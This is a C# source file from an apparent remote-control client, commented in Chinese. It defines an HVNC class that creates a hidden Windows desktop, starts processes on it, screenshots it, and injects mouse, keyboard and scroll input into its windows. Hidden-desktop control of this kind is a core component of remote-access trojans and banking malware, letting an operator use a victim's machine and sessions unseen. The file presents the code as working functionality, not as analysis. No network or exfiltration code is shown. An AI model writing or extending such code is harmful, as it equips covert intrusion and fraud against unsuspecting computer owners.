using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteControl.Client.Utils
{
    /// <summary>
    /// 隐藏虚拟桌面管理 - 使用 Windows Desktop API
    /// </summary>
    public partial class HVNCDesktop : IDisposable
    {
        private IntPtr _hDesktop = IntPtr.Zero;
        private string _desktopName;
        private bool _disposed = false;

        public string DesktopName { get { return _desktopName; } }

        /// <summary>
        /// 创建隐藏桌面
        /// </summary>
        public bool Create(string name)
        {
            _desktopName = name;
            _hDesktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
            return _hDesktop != IntPtr.Zero;
        }

        /// <summary>
        /// 在隐藏桌面上启动进程
        /// </summary>
        public bool StartProcess(string filePath, string arguments)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = _desktopName;
            PROCESS_INFORMATION pi;

            string cmdLine = string.IsNullOrEmpty(arguments)
                ? filePath
                : filePath + " " + arguments;

            return CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero,
                false, 0, IntPtr.Zero, null, ref si, out pi);
        }

        /// <summary>
        /// 截取隐藏桌面屏幕
        /// </summary>
        public Bitmap CaptureScreen()
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return null;

            try
            {
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                if (width == 0 || height == 0)
                {
                    width = 1920;
                    height = 1080;
                }

                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr memDC = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, width, height);
                IntPtr oldBitmap = SelectObject(memDC, hBitmap);

                BitBlt(memDC, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

                SelectObject(memDC, oldBitmap);
                Bitmap bmp = Image.FromHbitmap(hBitmap);

                DeleteObject(hBitmap);
                DeleteDC(memDC);
                ReleaseDC(IntPtr.Zero, hdc);

                return bmp;
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入鼠标事件
        /// </summary>
        public void InjectMouseEvent(int x, int y, int button, int operation)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = FindWindowAtPoint(x, y);
                if (hWnd == IntPtr.Zero) return;

                RECT rect;
                GetWindowRect(hWnd, out rect);
                int localX = x - rect.Left;
                int localY = y - rect.Top;
                IntPtr lParam = (IntPtr)((localY << 16) | (localX & 0xFFFF));

                uint msg = WM_MOUSEMOVE;
                switch (operation)
                {
                    case 0: // MouseDown
                        msg = (button == 1) ? WM_LBUTTONDOWN : WM_RBUTTONDOWN;
                        break;
                    case 1: // MouseUp
                        msg = (button == 1) ? WM_LBUTTONUP : WM_RBUTTONUP;
                        break;
                    case 2: // MouseMove
                        msg = WM_MOUSEMOVE;
                        break;
                    case 3: // DoubleClick
                        msg = (button == 1) ? WM_LBUTTONDBLCLK : WM_RBUTTONDBLCLK;
                        break;
                }

                PostMessage(hWnd, msg, IntPtr.Zero, lParam);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入键盘事件
        /// </summary>
        public void InjectKeyboardEvent(int keyCode, bool isKeyDown)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = GetForegroundWindowOnDesktop();
                if (hWnd == IntPtr.Zero) return;

                uint msg = isKeyDown ? WM_KEYDOWN : WM_KEYUP;
                PostMessage(hWnd, msg, (IntPtr)keyCode, IntPtr.Zero);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 在隐藏桌面上找到指定点的窗口
        /// </summary>
        private IntPtr FindWindowAtPoint(int x, int y)
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;
                RECT rect;
                GetWindowRect(hWnd, out rect);
                if (x >= rect.Left && x <= rect.Right &&
                    y >= rect.Top && y <= rect.Bottom)
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        /// <summary>
        /// 获取隐藏桌面上的前台窗口(第一个可见窗口)
        /// </summary>
        private IntPtr GetForegroundWindowOnDesktop()
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        public void Dispose()
        {
            if (!_disposed && _hDesktop != IntPtr.Zero)
            {
                CloseDesktop(_hDesktop);
                _hDesktop = IntPtr.Zero;
                _disposed = true;
            }
        }

        /// <summary>
        /// 获取虚拟桌面实际分辨率
        /// </summary>
        public void GetScreenResolution(out int width, out int height)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
            {
                width = 1920;
                height = 1080;
                return;
            }
            try
            {
                width = GetSystemMetrics(SM_CXSCREEN);
                height = GetSystemMetrics(SM_CYSCREEN);
                if (width == 0 || height == 0)
                {
                    width = 1920;
                    height = 1080;
                }
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入滚轮事件
        /// </summary>
        public void InjectScrollEvent(int x, int y, int delta)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = FindWindowAtPoint(x, y);
                if (hWnd == IntPtr.Zero) return;

                // WM_MOUSEWHEEL: wParam = delta << 16, lParam = screen coords
                IntPtr wParam = (IntPtr)(delta << 16);
                IntPtr lParam = (IntPtr)((y << 16) | (x & 0xFFFF));
                PostMessage(hWnd, WM_MOUSEWHEEL, wParam, lParam);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

    }
}
